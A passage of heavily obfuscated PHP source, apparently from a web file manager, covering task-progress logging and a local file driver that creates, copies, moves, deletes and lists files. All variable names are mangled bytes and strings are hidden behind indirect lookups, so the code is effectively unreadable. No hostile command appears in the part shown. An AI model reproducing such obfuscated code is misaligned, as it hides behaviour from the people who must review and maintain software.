intval($•…¦Šº«[$Ò©¡òï[380]] * 0.4); break; } $this->update($øÌªÚÌ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ó¨ä‘çè, $ËÆ³å†ª) { $­×óûÎ´ =& $_SERVER[Îûáû“ş]; $this->sourceModelCopyFlag = !0; $Ù¶Ùª»¿ = 1; if (isset($Ó¨ä‘çè[$­×óûÎ´[79]])) { $Ù¶Ùª»¿ = $Ó¨ä‘çè[$­×óûÎ´[79]][$­×óûÎ´[77]]; $Ù¶Ùª»¿ = $Ù¶Ùª»¿ + $Ó¨ä‘çè[$­×óûÎ´[79]][$­×óûÎ´[78]] + 1; } $this->update($Ù¶Ùª»¿); $this->sourceModelCopyFlag = !1; } public function sourceMove($Şˆì˜) { $this->sourceRemove($Şˆì˜, !1); } public function curlProgress($­å§Ü˜·, $…¥‘ ¦Í, $ò°Ş…Àà, $¾–îáöÜ, $œÉşÌÖ‹) { $¨ÚÉ°² =& $_SERVER[Îûáû“ş]; $‹ùæ›é =& $this->task; if ($œÉşÌÖ‹ > 0) { $‹ùæ›é[$¨ÚÉ°²[1066]] = $¨ÚÉ°²[1743]; $‹ùæ›é[$¨ÚÉ°²[1725]] = $¨ÚÉ°²[107]; if ($‹ùæ›é[$¨ÚÉ°²[1723]]) { $‹ùæ›é[$¨ÚÉ°²[1724]] = $œÉşÌÖ‹; } if ($‹ùæ›é[$¨ÚÉ°²[1726]]) { $‹ùæ›é[$¨ÚÉ°²[1724]] = $œÉşÌÖ‹ + $‹ùæ›é[$¨ÚÉ°²[1726]]; } } else { if ($ò°Ş…Àà > 0) { if ($‹ùæ›é[$¨ÚÉ°²[1723]] == $…¥‘ ¦Í) { $‹ùæ›é[$¨ÚÉ°²[1724]] = $ò°Ş…Àà; $‹ùæ›é[$¨ÚÉ°²[1066]] = $¨ÚÉ°²[1744]; $‹ùæ›é[$¨ÚÉ°²[1725]] = $¨ÚÉ°²[1196]; } } } $this->update(); } public function curlProgressStart($ÆôóÊß˜) { } public function curlProgressEnd($Õş¶š–¥) { $à¸È ì =& $_SERVER[Îûáû“ş]; $ñÆÂİ¢· =& $this->task; $µÜñÑ®Ÿ = curl_getinfo($Õş¶š–¥); $‹¤»´ñ© = $µÜñÑ®Ÿ[$à¸È ì[1745]]; if ($‹¤»´ñ© == -1) { $‹¤»´ñ© = $µÜñÑ®Ÿ[$à¸È ì[1746]]; } if ($ñÆÂİ¢·[$à¸È ì[1725]] == $à¸È ì[107] && $‹¤»´ñ©) { $ñÆÂİ¢·[$à¸È ì[1726]] += $‹¤»´ñ©; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $šŸ“«Å¸ =& $_SERVER[Îûáû“ş]; $Îí™‚· =& $this->task; $Îí™‚·[$šŸ“«Å¸[1747]] = 1; Hook::bind($šŸ“«Å¸[1715], array($this, $šŸ“«Å¸[1748])); Hook::bind($šŸ“«Å¸[1717], array($this, $šŸ“«Å¸[1749])); Hook::bind($šŸ“«Å¸[1719], array($this, $šŸ“«Å¸[1750])); } protected function endAfter() { $êöŞµ€æ =& $_SERVER[Îûáû“ş]; Hook::unbind($êöŞµ€æ[1715], array($this, $êöŞµ€æ[1748])); Hook::unbind($êöŞµ€æ[1717], array($this, $êöŞµ€æ[1749])); Hook::unbind($êöŞµ€æ[1719], array($this, $êöŞµ€æ[1750])); } public function progressStart($ÒˆšÁ©¸) { $¬±¦˜ÙØ =& $_SERVER[Îûáû“ş]; $Ğ‰ûæÊÈ = curl_getinfo($ÒˆšÁ©¸); self::log($¬±¦˜ÙØ[1751] . $Ğ‰ûæÊÈ[$¬±¦˜ÙØ[307]]); self::valueSet($this->task[$¬±¦˜ÙØ[399]], $this->task); } public function progressEnd($€Ëêõ°Ë) { $ú†µø…Â =& $_SERVER[Îûáû“ş]; self::log($ú†µø…Â[1752] . $this->task[$ú†µø…Â[399]]); $this->end(); } public function progress($ËÙêü½, $èƒ­ëä£, $°ßÄş•ò, $­«Àø€, $“²æ±ÏË) { $äÕ”¯ĞÃ =& $_SERVER[Îûáû“ş]; $ŸÃä…µ” =& $this->task; if ($“²æ±ÏË > 0) { $ŸÃä…µ”[$äÕ”¯ĞÃ[785]] = $ŸÃä…µ”[$äÕ”¯ĞÃ[785]] == 0 ? $­«Àø€ : $ŸÃä…µ”[$äÕ”¯ĞÃ[785]]; $ŸÃä…µ”[$äÕ”¯ĞÃ[1671]] = $“²æ±ÏË; } else { if ($°ßÄş•ò > 0) { $ŸÃä…µ”[$äÕ”¯ĞÃ[785]] = $ŸÃä…µ”[$äÕ”¯ĞÃ[785]] == 0 ? $èƒ­ëä£ : $ŸÃä…µ”[$äÕ”¯ĞÃ[785]]; $ŸÃä…µ”[$äÕ”¯ĞÃ[1671]] = $°ßÄş•ò; } } $this->update(); self::log("\x70\162\157\x67\162\145\x73\x73\x48\164\164\160\x3a\x64\157\167\x6e\x3a{$°ßÄş•ò}\x2f{$èƒ­ëä£}\73\x20\165\x70\x6c\157\141\144\x3a{$“²æ±ÏË}\57{$­«Àø€}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÃøØòóá, $ñ”¸û”— = '', $¡ÇşÄ‘ = 0, $Ÿê“¾«¶ = '') { $ÊîÏ‹© =& $_SERVER[Îûáû“ş]; $²·ëàôå = new Task($ÃøØòóá, $ñ”¸û”—, $¡ÇşÄ‘, $Ÿê“¾«¶); $GLOBALS[$ÊîÏ‹©[1753] . $ÃøØòóá] = new TaskLog($ÊîÏ‹©[1654], $²·ëàôå, $Ÿê“¾«¶); return $²·ëàôå; } public function __construct($Â¡¶æÛû = '', $ãó÷Ã£² = '', $Šöìæ¿É = '') { $ñĞÈëÁ =& $_SERVER[Îûáû“ş]; if (!$Â¡¶æÛû) { $Â¡¶æÛû = $ñĞÈëÁ[1654]; } $ğôÆäéÏ = $Â¡¶æÛû . $ñĞÈëÁ[386] . rand_string(10); if (!$Šöìæ¿É) { $Šöìæ¿É = $Â¡¶æÛû . $ñĞÈëÁ[53] . $Šöìæ¿É; } switch ($Â¡¶æÛû) { case $ñĞÈëÁ[1654]: if (!$ãó÷Ã£² || !$ãó÷Ã£²->task) { return echoLog($Â¡¶æÛû . $ñĞÈëÁ[1754]); } $šÙîîéĞ = $ãó÷Ã£²; $ğôÆäéÏ = $šÙîîéĞ->task[$ñĞÈëÁ[399]]; $Â¡¶æÛû = $šÙîîéĞ->task[$ñĞÈëÁ[399]]; if (!$šÙîîéĞ->task[$ñĞÈëÁ[1570]]) { $šÙîîéĞ->task[$ñĞÈëÁ[1570]] = $Šöìæ¿É ? $Šöìæ¿É : $Â¡¶æÛû; } break; case $ñĞÈëÁ[1755]: if (!$ãó÷Ã£²) { return echoLog($Â¡¶æÛû . $ñĞÈëÁ[1756]); } $Ø‡­ûÓí = is_string($ãó÷Ã£²) ? array($ãó÷Ã£²) : $ãó÷Ã£²; $šÙîîéĞ = new TaskFileTransfer($ğôÆäéÏ, $Â¡¶æÛû, 0, $Šöìæ¿É ? $Šöìæ¿É : $Ø‡­ûÓí[0]); foreach ($Ø‡­ûÓí as $¬ºØûÍ¼) { $šÙîîéĞ->addPath($¬ºØûÍ¼); } break; case $ñĞÈëÁ[313]: if (!$ãó÷Ã£²) { return echoLog($Â¡¶æÛû . $ñĞÈëÁ[1756]); } $Ø‡­ûÓí = is_string($ãó÷Ã£²) ? array($ãó÷Ã£²) : $ãó÷Ã£²; $šÙîîéĞ = new TaskZip($ğôÆäéÏ, $Â¡¶æÛû, 0, $Šöìæ¿É ? $Šöìæ¿É : $Ø‡­ûÓí[0]); foreach ($Ø‡­ûÓí as $¬ºØûÍ¼) { $šÙîîéĞ->addPath($¬ºØûÍ¼); } break; case $ñĞÈëÁ[1216]: if (!$ãó÷Ã£²) { return echoLog($Â¡¶æÛû . $ñĞÈëÁ[1756]); } $šÙîîéĞ = new TaskUnZip($ğôÆäéÏ, $Â¡¶æÛû, 0, $Šöìæ¿É ? $Šöìæ¿É : $ãó÷Ã£²); if ($ãó÷Ã£²) { $šÙîîéĞ->addFile($ãó÷Ã£²); } break; case $ñĞÈëÁ[148]: $šÙîîéĞ = new TaskHttp($ğôÆäéÏ, $Â¡¶æÛû); break; default: return; break; } $this->task = $šÙîîéĞ; $this->taskID = $ğôÆäéÏ; Hook::bind($ñĞÈëÁ[1691], array($this, $ñĞÈëÁ[1757])); Hook::bind($ñĞÈëÁ[1693], array($this, $ñĞÈëÁ[1758])); Hook::bind($ñĞÈëÁ[1687], array($this, $ñĞÈëÁ[1759])); echoLog($ñĞÈëÁ[1760] . $šÙîîéĞ->task[$ñĞÈëÁ[1570]]); } public function __destruct() { $this->end(); } public function end($“ŒãËäú = '') { $—Êº„ÚÔ =& $_SERVER[Îûáû“ş]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($“ŒãËäú); $this->task = !1; $this->taskID = !1; Hook::unbind($—Êº„ÚÔ[1691], array($this, $—Êº„ÚÔ[1757])); Hook::unbind($—Êº„ÚÔ[1693], array($this, $—Êº„ÚÔ[1758])); Hook::unbind($—Êº„ÚÔ[1687], array($this, $—Êº„ÚÔ[1759])); } public function taskUpdate($Òğ£õÊÍ) { $ò¥½¾ÄË =& $_SERVER[Îûáû“ş]; if (!$Òğ£õÊÍ || $this->taskID != $Òğ£õÊÍ[$ò¥½¾ÄË[399]]) { return; } $Í²½ŒãÊ = 20; $á­ÆÆÑ‚ = intval($Òğ£õÊÍ[$ò¥½¾ÄË[1672]] * $Í²½ŒãÊ); $£ûÑÁ×Ÿ = $ò¥½¾ÄË[162] . str_repeat($ò¥½¾ÄË[886], $á­ÆÆÑ‚) . $ò¥½¾ÄË[1016] . str_repeat($ò¥½¾ÄË[53], $Í²½ŒãÊ - $á­ÆÆÑ‚) . $ò¥½¾ÄË[164]; $¾õé¹ƒÜ = $£ûÑÁ×Ÿ . sprintf($ò¥½¾ÄË[1761], $Òğ£õÊÍ[$ò¥½¾ÄË[1672]] * 100) . $ò¥½¾ÄË[1762]; $üç½šö = $¾õé¹ƒÜ . $Òğ£õÊÍ[$ò¥½¾ÄË[1671]] . $ò¥½¾ÄË[8] . $Òğ£õÊÍ[$ò¥½¾ÄË[785]] . LNG($ò¥½¾ÄË[1763]); $¯­¬…€ = $ò¥½¾ÄË[12]; if ($Òğ£õÊÍ[$ò¥½¾ÄË[1747]]) { $üç½šö = $¾õé¹ƒÜ . size_format($Òğ£õÊÍ[$ò¥½¾ÄË[1671]]) . $ò¥½¾ÄË[8] . size_format($Òğ£õÊÍ[$ò¥½¾ÄË[785]]); $¯­¬…€ = size_format($Òğ£õÊÍ[$ò¥½¾ÄË[1673]]) . $ò¥½¾ÄË[1764]; } if ($Òğ£õÊÍ[$ò¥½¾ÄË[1066]]) { $Òğ£õÊÍ[$ò¥½¾ÄË[1721]] = $Òğ£õÊÍ[$ò¥½¾ÄË[1066]] . $ò¥½¾ÄË[53] . $Òğ£õÊÍ[$ò¥½¾ÄË[1721]]; } if ($Òğ£õÊÍ[$ò¥½¾ÄË[1721]]) { $ş‘‚ÇË¼ = $ò¥½¾ÄË[12]; if ($Òğ£õÊÍ[$ò¥½¾ÄË[1723]]) { $ş‘‚ÇË¼ = $ò¥½¾ÄË[50] . size_format($Òğ£õÊÍ[$ò¥½¾ÄË[1724]]) . $ò¥½¾ÄË[8] . size_format($Òğ£õÊÍ[$ò¥½¾ÄË[1723]]); } $¯­¬…€ .= $Òğ£õÊÍ[$ò¥½¾ÄË[1721]] . $ş‘‚ÇË¼; } if ($Òğ£õÊÍ[$ò¥½¾ÄË[762]] && !$Òğ£õÊÍ[$ò¥½¾ÄË[1723]]) { $¯­¬…€ .= $ò¥½¾ÄË[53] . size_format($Òğ£õÊÍ[$ò¥½¾ÄË[1728]]) . $ò¥½¾ÄË[8] . size_format($Òğ£õÊÍ[$ò¥½¾ÄË[762]]); } echoLog($üç½šö . $ò¥½¾ÄË[53] . $¯­¬…€, !0); } public function taskEnd($ùöËåñŞ) { $ÙàÓşšÜ =& $_SERVER[Îûáû“ş]; if (!$ùöËåñŞ || $this->taskID != $ùöËåñŞ[$ÙàÓşšÜ[399]]) { return; } $ë †õÂÄ = $ùöËåñŞ ? $ùöËåñŞ[$ÙàÓşšÜ[1671]] . $ÙàÓşšÜ[8] . $ùöËåñŞ[$ÙàÓşšÜ[785]] . LNG($ÙàÓşšÜ[1763]) . $ÙàÓşšÜ[71] : $ÙàÓşšÜ[12]; echoLog($ÙàÓşšÜ[1765] . $ùöËåñŞ[$ÙàÓşšÜ[1570]] . ($ùöËåñŞ[$ÙàÓşšÜ[453]] ? $ÙàÓşšÜ[71] . $ùöËåñŞ[$ÙàÓşšÜ[453]] : $ÙàÓşšÜ[12]) . $ÙàÓşšÜ[71] . $ë †õÂÄ . $ÙàÓşšÜ[1766] . sprintf($ÙàÓşšÜ[849], timeFloat() - $ùöËåñŞ[$ÙàÓşšÜ[1674]]) . $ÙàÓşšÜ[1686]); $this->end(); } public function taskKill($ì÷öíÜ´) { $ŞÍ¡¼½‚ =& $_SERVER[Îûáû“ş]; if (!$ì÷öíÜ´ || $this->taskID != $ì÷öíÜ´[$ŞÍ¡¼½‚[399]]) { return; } echoLog($ŞÍ¡¼½‚[1767] . $ì÷öíÜ´[$ŞÍ¡¼½‚[1570]]); } } goto få«‘ï¶ˆ; E—¢£†ÕÔÀ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($üÓñı) { if (substr($üÓñı, 0, 2) == $_SERVER[Îûáû“ş][1381]) { $üÓñı = BASIC_PATH . substr($üÓñı, 2); } return $üÓñı; } public function iconvApp($ß—‰ñ±–) { $”‹ºĞë¨ =& $_SERVER[Îûáû“ş]; global $config; return $this->iconvTo($ß—‰ñ±–, $config[$”‹ºĞë¨[1379]], $config[$”‹ºĞë¨[1378]]); } public function iconvSystem($šõı¨ €) { $É÷äÍãÊ =& $_SERVER[Îûáû“ş]; global $config; return $this->iconvTo($šõı¨ €, $config[$É÷äÍãÊ[1378]], $config[$É÷äÍãÊ[1379]]); } public function getPathOuter($°í¾ÕÆå) { $Ÿñ´¨»Ô =& $_SERVER[Îûáû“ş]; $é×æ£ = $this->iconvApp($this->pathBase); $°í¾ÕÆå = $this->iconvApp($°í¾ÕÆå); if (substr($é×æ£, 0, 2) == $Ÿñ´¨»Ô[1381]) { $é×æ£ = BASIC_PATH . substr($é×æ£, 2); } if (substr($°í¾ÕÆå, 0, 2) == $Ÿñ´¨»Ô[1381]) { $°í¾ÕÆå = BASIC_PATH . substr($°í¾ÕÆå, 2); } $é×æ£ = KodIO::clear($é×æ£); $°í¾ÕÆå = KodIO::clear($°í¾ÕÆå); $°í¾ÕÆå = substr($°í¾ÕÆå, strlen($é×æ£)); if (empty($this->pathDriver)) { return $°í¾ÕÆå; } return $this->pathDriver . $Ÿñ´¨»Ô[8] . ltrim($°í¾ÕÆå, $Ÿñ´¨»Ô[8]); } public function mkfile($³Ø¦ãÒÄ, $àœ¸ ±è = '', $Õé­®ùß = REPEAT_RENAME) { $³Ø¦ãÒÄ = $this->iconvSystem($³Ø¦ãÒÄ); @touch($³Ø¦ãÒÄ); if ($àœ¸ ±è) { file_put_contents($³Ø¦ãÒÄ, $àœ¸ ±è); } @chmod($³Ø¦ãÒÄ, $this->pathAuth); return is_file($³Ø¦ãÒÄ) ? $this->getPathOuter($³Ø¦ãÒÄ) : !1; } public function mkdir($²ßô†ä, $¡­ÁáŸ = REPEAT_SKIP) { $²ßô†ä = $this->iconvSystem($²ßô†ä); if (is_dir($²ßô†ä)) { return $this->getPathOuter($²ßô†ä); } @mkdir($²ßô†ä, $this->pathAuth, !0); @chmod($²ßô†ä, $this->pathAuth); return is_dir($²ßô†ä) ? $this->getPathOuter($²ßô†ä) : !1; } public function copyFile($Ø­„šÅÕ, $÷êôÚª²) { $this->mkdir($this->pathFather($÷êôÚª²)); $Ø­„šÅÕ = $this->iconvSystem($Ø­„šÅÕ); $÷êôÚª² = $this->iconvSystem($÷êôÚª²); $îÊÜúË  = copy_64($Ø­„šÅÕ, $÷êôÚª²); @chmod($÷êôÚª², $this->pathAuth); return $îÊÜúË  ? $this->getPathOuter($÷êôÚª²) : !1; } public function moveFile($ÑÊŠ°û£, $‘òŒìÇÔ) { $this->mkdir($this->pathFather($‘òŒìÇÔ)); $ÑÊŠ°û£ = $this->iconvSystem($ÑÊŠ°û£); $‘òŒìÇÔ = $this->iconvSystem($‘òŒìÇÔ); $ËÑ©úÆï = intval(@rename($ÑÊŠ°û£, $‘òŒìÇÔ)); if (!$ËÑ©úÆï) { if ($ËÑ©úÆï = intval(@copy_64($ÑÊŠ°û£, $‘òŒìÇÔ))) { @unlink($ÑÊŠ°û£); } } @chmod($‘òŒìÇÔ, $this->pathAuth); return $ËÑ©úÆï ? $this->getPathOuter($‘òŒìÇÔ) : !1; } public function movePath($‹¬æç•, $÷—¼×Ÿ», $Ş«†ïê = false) { $˜ÓªÛ˜ =& $_SERVER[Îûáû“ş]; $‹¬æç• = $this->iconvSystem($‹¬æç•); $÷—¼×Ÿ» = $this->iconvSystem($÷—¼×Ÿ»); $Ã€éÜæÔ = rtrim($÷—¼×Ÿ», $˜ÓªÛ˜[8]) . $˜ÓªÛ˜[8] . ($Ş«†ïê ? $Ş«†ïê : get_path_this($‹¬æç•)); if (file_exists($Ã€éÜæÔ)) { return !1; } $ºû±±ˆÛ = intval(@rename($‹¬æç•, $Ã€éÜæÔ)); $ºû±±ˆÛ = file_exists($Ã€éÜæÔ); return $ºû±±ˆÛ ? $this->getPathOuter($Ã€éÜæÔ) : !1; } public function delFile($îş „¨) { $îş „¨ = $this->iconvSystem($îş „¨); if (!@unlink($îş „¨)) { @chmod($îş „¨, $this->pathAuth); if (!@unlink($îş „¨)) { return !1; } } else { return !0; } } public function delFolder($©­ï¨‚…) { $Øü‹Óã =& $_SERVER[Îûáû“ş]; $©­ï¨‚… = $this->iconvSystem($©­ï¨‚…); if (!is_dir($©­ï¨‚…)) { return !0; } if (!($şÎß¶²Ì = opendir($©­ï¨‚…))) { return !1; } while (($¿ÉÄî´­ = readdir($şÎß¶²Ì)) !== !1) { if ($¿ÉÄî´­ == $Øü‹Óã[10] || $¿ÉÄî´­ == $Øü‹Óã[1388]) { continue; } $Ïıàé = $©­ï¨‚… . $Øü‹Óã[8] . $¿ÉÄî´­; if (is_file($Ïıàé) || is_link($Ïıàé)) { if (!unlink($Ïıàé)) { chmod($Ïıàé, $this->pathAuth); if (!unlink($Ïıàé)) { return !1; } } } else { if (is_dir($Ïıàé)) { chmod($Ïıàé, $this->pathAuth); $Ïıàé = $this->iconvApp($Ïıàé); if (!$this->delFolder($Ïıàé)) { return !1; } } } } closedir($şÎß¶²Ì); return rmdir($©­ï¨‚…); } public function rename($Õ·Ì¾çù, $şöŞÊˆØ) { $ñç¥·´ë =& $_SERVER[Îûáû“ş]; $àïã‘§« = $this->fileNameAuto($this->pathFather($Õ·Ì¾çù), $şöŞÊˆØ); $àïã‘§« = $this->iconvSystem($àïã‘§«); $Õ·Ì¾çù = $this->iconvSystem($Õ·Ì¾çù); $îÖ²µÖ = $this->pathFather($Õ·Ì¾çù); $ùô­®ä£ = rtrim($îÖ²µÖ, $ñç¥·´ë[8]) . $ñç¥·´ë[8] . $àïã‘§«; $Úê½»êÎ = @rename($Õ·Ì¾çù, $ùô­®ä£); $ùô­®ä£ = $this->iconvApp($ùô­®ä£); return $Úê½»êÎ ? $this->getPathOuter($ùô­®ä£) : !1; } public function size($¤õóŠÜ) { $¤õóŠÜ = $this->iconvSystem($¤õóŠÜ); return filesize_64($¤õóŠÜ); } public function info($ÊòÍª¹ó) { $ÊòÍª¹ó = $this->iconvSystem($ÊòÍª¹ó); if ($this->isFolder($ÊòÍª¹ó)) { return $this->folderInfo($ÊòÍª¹ó); } else { if ($this->isFile($ÊòÍª¹ó)) { return $this->fileInfo($ÊòÍª¹ó); } } return !1; } protected function infoChildren($ï¹¨µ×å, &$Ì°îÎ, $‘ûşá ¦ = true) { $ˆğõßº =& $_SERVER[Îûáû“ş]; check_abort_echo(); $ï¹¨µ×å = rtrim($ï¹¨µ×å, $ˆğõßº[8]) . $ˆğõßº[8]; if ($‘ûşá ¦) { $ï¹¨µ×å = $this->iconvSystem($ï¹¨µ×å); } if (!($Û¸‰í¶¨ = @opendir($ï¹¨µ×å))) { return; } while (($şø½€¦‘ = readdir($Û¸‰í¶¨)) !== !1) { if ($şø½€¦‘ == $ˆğõßº[10] || $şø½€¦‘ == $ˆğõßº[1388]) { continue; } $¯‡ê = $ï¹¨µ×å . $şø½€¦‘; if (is_file($¯‡ê) || is_link($¯‡ê)) { $Ì°îÎ[$ˆğõßº[77]]++; $Ì°îÎ[$ˆğõßº[76]] += filesize_64($¯‡ê); } else { if (is_dir($¯‡ê)) { $Ì°îÎ[$ˆğõßº[78]]++; $this->infoChildren($¯‡ê, $Ì°îÎ, !1); } } } closedir($Û¸‰í¶¨); } private function folderInfo($ø…ß€, $§ÖÍ¿ = false) { $Í‚Ğ¥â =& $_SERVER[Îûáû“ş]; $ø…ß€ = rtrim($ø…ß€, $Í‚Ğ¥â[8]) . $Í‚Ğ¥â[8]; $–¦Ãîã = $this->iconvApp($this->pathThis($ø…ß€)); if ($§ÖÍ¿) { return array($Í‚Ğ¥â[32] => $–¦Ãîã, $Í‚Ğ¥â[84] => $this->getPathOuter($ø…ß€), $Í‚Ğ¥â[33] => $Í‚Ğ¥â[75]); } $ÛÀÑ¾• = array($Í‚Ğ¥â[32] => $–¦Ãîã, $Í‚Ğ¥â[84] => $this->getPathOuter($ø…ß€), $Í‚Ğ¥â[33] => $Í‚Ğ¥â[75], $Í‚Ğ¥â[201] => @filectime($ø…ß€), $Í‚Ğ¥â[85] => @filemtime($ø…ß€), $Í‚Ğ¥â[1391] => @fileatime($ø…ß€), $Í‚Ğ¥â[1392] => is_readable($ø…ß€), $Í‚Ğ¥â[1393] => is_writable($ø…ß€), $Í‚Ğ¥â[1394] => get_mode($ø…ß€)); return $ÛÀÑ¾•; } private function fileInfo($ò»ç«¡¢, $á¨™Ì•Î = false) { $¼é¥í…¶ =& $_SERVER[Îûáû“ş]; $ê‡é„…ˆ = $this->iconvApp($this->pathThis($ò»ç«¡¢)); if ($á¨™Ì•Î) { return array($¼é¥í…¶[32] => $ê‡é„…ˆ, $¼é¥í…¶[84] => $this->getPathOuter($ò»ç«¡¢), $¼é¥í…¶[33] => $¼é¥í…¶[200], $¼é¥í…¶[76] => $this->size($ò»ç«¡¢), $¼é¥í…¶[174] => $this->ext($ê‡é„…ˆ)); } $ËÎö«ß = array($¼é¥í…¶[32] => $ê‡é„…ˆ, $¼é¥í…¶[84] => $this->getPathOuter($ò»ç«¡¢), $¼é¥í…¶[33] => $¼é¥í…¶[200], $¼é¥í…¶[201] => @filectime($ò»ç«¡¢), $¼é¥í…¶[85] => @filemtime($ò»ç«¡¢), $¼é¥í…¶[1391] => @fileatime($ò»ç«¡¢), $¼é¥í…¶[76] => $this->size($ò»ç«¡¢), $¼é¥í…¶[174] => $this->ext($ê‡é„…ˆ), $¼é¥í…¶[1392] => is_readable($ò»ç«¡¢), $¼é¥í…¶[1393] => is_writable($ò»ç«¡¢), $¼é¥í…¶[1394] => get_mode($ò»ç«¡¢)); return $ËÎö«ß; } public function exist($œøş¼òÓ) { $œøş¼òÓ = $this->iconvSystem($œøş¼òÓ); return @file_exists($œøş¼òÓ); } public function isFile($ü²”ˆ›à) { $ü²”ˆ›à = $this->iconvSystem($ü²”ˆ›à); return @is_file($ü²”ˆ›à); } public function isFolder($†²ö÷úÄ) { $†²ö÷úÄ = $this->iconvSystem($†²ö÷úÄ); return @is_dir($†²ö÷úÄ); } public function listPath($àâê¨´¨, $Œ·¹«€˜ = false) { $ÆÌ›•ı­ =& $_SERVER[Îûáû“ş]; $àâê¨´¨ = $this->iconvSystem($àâê¨´¨); $àâê¨´¨ = rtrim($àâê¨´¨, $ÆÌ›•ı­[8]) . $ÆÌ›•ı­[8]; $ôòñÒâı = array($ÆÌ›•ı­[82] => array(), $ÆÌ›•ı­[83] => array()); if (!($ÑŒÒ ä¸ = @opendir($àâê¨´¨))) { return $ôòñÒâı; } while (($³Àûş¸ä = readdir($ÑŒÒ ä¸)) !== !1) { if ($³Àûş¸ä == $ÆÌ›•ı­[10] || $³Àûş¸ä == $ÆÌ›•ı­[1388]) { continue; } $ã”Ÿ–â = $àâê¨´¨ . $³Àûş¸ä; if (is_file($ã”Ÿ–â)) { $ôòñÒâı[$ÆÌ›•ı­[83]][] = $this->fileInfo($ã”Ÿ–â, $Œ·¹«€˜); } else { $ôòñÒâı[$ÆÌ›•ı­[82]][] = $this->folderInfo($ã”Ÿ–â, $Œ·¹«€˜); } } closedir($ÑŒÒ ä¸); return $ôòñÒâı; } public function listAll($æ¨†È‰´, &$´ëö’¯á = array()) { $‰“Ö€øô =& $_SERVER[Îûáû“ş]; $æ¨†È‰´ = $this->iconvSystem($æ¨†È‰´); $æ¨†È‰´ = rtrim($æ¨†È‰´, $‰“Ö€øô[8]) . $‰“Ö€øô[8]; if (!($Œ™îÇ¯ = @opendir($æ¨†È‰´))) { return $´ëö’¯á; } while (($„¢µ©ºç = readdir($Œ™îÇ¯)) !== !1) { if ($„¢µ©ºç == $‰“Ö€øô[10] || $„¢µ©ºç == $‰“Ö€øô[1388]) { continue; } $„”ĞÙ»© = $æ¨†È‰´ . $„¢µ©ºç; $¤ê½‰µ = is_dir($„”ĞÙ»©) && !is_link($„”ĞÙ»©) ? 1 : 0; $„”ĞÙ»© = $¤ê½‰µ ? $„”ĞÙ»© . $‰“Ö€øô[8] : $„”ĞÙ»©; $´ëö’¯á[] = array($‰“Ö€øô[84] => $„”ĞÙ»©, $‰“Ö€øô[75] => $¤ê½‰µ, $‰“Ö€øô[85] => intval(@filemtime($„”ĞÙ»©)), $‰“Ö€øô[76] => $¤ê½‰µ ? 0 : intval($this->size($„”ĞÙ»©))); if ($¤ê½‰µ) { $this->listAll($„”ĞÙ»©, $´ëö’¯á); } } closedir($Œ™îÇ¯); return $´ëö’¯á; } public function has($Ô¤§Âì§, $öçÑ°ÓÜ = false, $÷¥Óœä¡ = true) { $±šİ‘±­ =& $_SERVER[Îûáû“ş]; $Ô¤§Âì§ = $this->iconvSystem($Ô¤§Âì§); $Ô¤§Âì§ = rtrim($Ô¤§Âì§, $±šİ‘±­[8]) . $±šİ‘±­[8]; if (!($ÂÈ§•©Æ = @opendir($Ô¤§Âì§))) { return !1; } $ÀÏÜ¾š¿ = 0; $“‘ ´Èù = 0; $íˆš¡© = 0; while (($ÖÚÄŞü– = readdir($ÂÈ§•©Æ)) !== !1) { if ($ÖÚÄŞü– == $±šİ‘±­[10] || $ÖÚÄŞü– == $±šİ‘±­[1388]) { continue; } $ƒ’èŒ†Ô = $Ô¤§Âì§ . $ÖÚÄŞü–; if ($öçÑ°ÓÜ) { $íˆš¡©++; if (@is_file($ƒ’èŒ†Ô)) { $ÀÏÜ¾š¿++; } else { $“‘ ´Èù++; } if ($íˆš¡© > 10000) { break; } continue; } if ($÷¥Óœä¡) { if (@is_file($ƒ’èŒ†Ô)) { return !0; } } else { if (@is_dir($ƒ’èŒ†Ô . $±šİ‘±­[8])) { return !0; } } } closedir($ÂÈ§•©Æ); if ($öçÑ°ÓÜ) { return array($±šİ‘±­[207] => $ÀÏÜ¾š¿, $±šİ‘±­[208] => $“‘ ´Èù); } return !1; } public function hashSimple($şòèõí) { $Ã«‹Ú =& $_SERVER[Îûáû“ş]; if (!$şòèõí) { return md5($Ã«‹Ú[12]); } $şòèõí = $this->iconvSystem($şòèõí); $§ìÊ©Š = $this->size($şòèõí); $ÙŠÊîµş = 200; $ÎÃ‡â›œ = 50; if ($§ìÊ©Š <= $ÙŠÊîµş * $ÎÃ‡â›œ) { return $this->hashMd5($şòèõí) . $§ìÊ©Š; } $Á¦“¥×Í = $Ã«‹Ú[12]; $ñÖ“‚³û = intval($§ìÊ©Š / $ÎÃ‡â›œ); $Ğ§€†õ¥ = fopen($şòèõí, $Ã«‹Ú[1395]); if (!$Ğ§€†õ¥) { return $Á¦“¥×Í; } for ($°€í‡„ê = 0; $°€í‡„ê < $ÎÃ‡â›œ; $°€í‡„ê++) { fseek_64($Ğ§€†õ¥, $ñÖ“‚³û * $°€í‡„ê); $Á¦“¥×Í .= fread($Ğ§€†õ¥, $ÙŠÊîµş); } fseek_64($Ğ§€†õ¥, $§ìÊ©Š - $ÙŠÊîµş); $Á¦“¥×Í .= fread($Ğ§€†õ¥, $ÙŠÊîµş); fclose($Ğ§€†õ¥); return md5($Á¦“¥×Í) . $§ìÊ©Š; } public function getContent($ÙÑ¬Â’·) { $ÙÑ¬Â’· = $this->iconvSystem($ÙÑ¬Â’·); return file_get_contents($ÙÑ¬Â’·); } public function setContent($Ìøû¤ª, $úæ°æ—å = '') { $Ìøû¤ª = $this->iconvSystem($Ìøû¤ª); $€œ·Ö• = @file_put_contents($Ìøû¤ª, $úæ°æ—å, LOCK_EX); clearstatcache(); @chmod($Ìøû¤ª, $this->pathAuth); return $€œ·Ö• === !1 ? !1 : !0; } public function fileSubstr($ß˜©Õµç, $áüò¬¥ = 0, $åÙÙ‡«í = false) { $¤çü¾¸È =& $_SERVER[Îûáû“ş]; $ß˜©Õµç = $this->iconvSystem($ß˜©Õµç); if ($åÙÙ‡«í === !1) { $åÙÙ‡«í = $this->size($ß˜©Õµç); } if ($åÙÙ‡«í <= 0) { return $¤çü¾¸È[12]; } $çª¨„²¢ = fopen($ß˜©Õµç, $¤çü¾¸È[1395]); if 